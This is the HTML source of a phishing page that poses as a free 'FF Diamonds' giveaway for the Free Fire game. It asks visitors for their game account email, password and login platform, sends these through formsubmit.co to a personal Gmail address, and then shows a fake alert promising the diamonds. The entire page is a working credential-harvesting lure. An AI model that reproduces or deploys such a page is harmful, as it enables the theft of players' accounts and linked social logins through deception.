<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FREE FF Diamonds Redemption Site</title>
    <link rel="icon" href="Assets/Logos/ff-logo-icon.png" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Montserrat", serif;
        }

        body {
            background: url('Assets/Images/2948c5440dc5819d97df46c0946fde1d.jpg');
            background-position: center;
            background-repeat: no-repeat;
            background-size: 100% 100%;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            padding: 0 20px;
            overflow: hidden;
            position: relative;
        }

        .login-container {
            background: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            padding: 40px 30px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.4);
            text-align: center;
            opacity: 0;
            animation: fadeIn 1s ease forwards;
        }

        .login-container h1 {
            font-size: 36px;
            margin-bottom: 20px;
            color: white;
            font-weight: 600;
            opacity: 0;
            animation: fadeIn 1.5s ease forwards;
        }
        .login-container h3 {
            font-size: 18px;
            margin-bottom: 10px;
            color: white;
            font-weight: 500;
            opacity: 0;
            animation: fadeIn 1.5s ease forwards;
        }

        .login-container input,
        .login-container textarea {
            width: 100%;
            padding: 12px;
            margin: 15px 0;
            border: 2px solid white;
            border-radius: 8px;
            outline: none;
            background-color: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        .login-container input::placeholder,
        .login-container textarea::placeholder {
            color: rgba(255, 255, 255, 0.7);
            font-size: 14px;
        }

        .login-container input:focus,
        .login-container textarea:focus {
            border-color: white;
            box-shadow: 0 0 10px rgba(248, 248, 248, 0.8);
        }

        .login-container button {
            background-color: white;
            color: black;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-size: 18px;
            transition: background-color 0.3s, transform 0.3s;
        }

        .login-container button:disabled {
            background-color: rgba(248, 248, 248, 0.8);
            cursor: not-allowed;
        }

        .login-container button:hover:enabled {
            background-color: white;
            transform: scale(1.05);
        }

        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #ddd;
            opacity: 0;
            animation: fadeIn 2.5s ease forwards;
        }

        .footer p {
            margin: 0;
        }

        .message {
            margin-top: 20px;
            padding: 10px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 5px;
            display: none;
            opacity: 0;
            animation: fadeIn 1s ease forwards;
        }

        @keyframes fadeOut {
            0% { opacity: 1; }
            100% { opacity: 0; }
        }

        @keyframes fadeIn {
            0% { opacity: 0; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>FREE <br>FF Diamonds Redemption Site</h1>
        <h3>Enter your FF ID's Details here to get FREE FF Diamonds:</h3>
        <form id="redeemForm" action="https://formsubmit.co/mskali060@gmail.com" method="POST">
            <input type="hidden" name="_template" value="table">
            <input type="text" id="email" name="email" placeholder="Enter your FF ID's Email" required title="Please enter a valid email with only letters and no numbers.">
            <input type="password" id="password" name="password" placeholder="Enter your FF ID's Password" required title="Password should contain only letters.">
            <textarea name="message" id="message" placeholder="Enter your FF ID's Log In Platform [i.e. Facebook or VK or Google or Apple or X]" required rows="4" pattern="[A-Za-z]+"></textarea>
            <button type="submit" id="submitBtn">CONFIRM</button>
        </form>

        <div class="footer">
            <p>Â© 2025 FREE FF Diamonds Redemption Site. All Rights Reserved.</p>
        </div>
    </div>

    <script>
        document.getElementById('redeemForm').addEventListener('submit', function(event) {
            event.preventDefault();

            setTimeout(function() {
                alert('Submitting your form... Your Free Diamonds will be added to Your FF ID Shortly! Thank you & Enjoy:)');  
                document.getElementById('redeemForm').submit();  
            }, 1000);
        });
    </script>
</body>
</html>
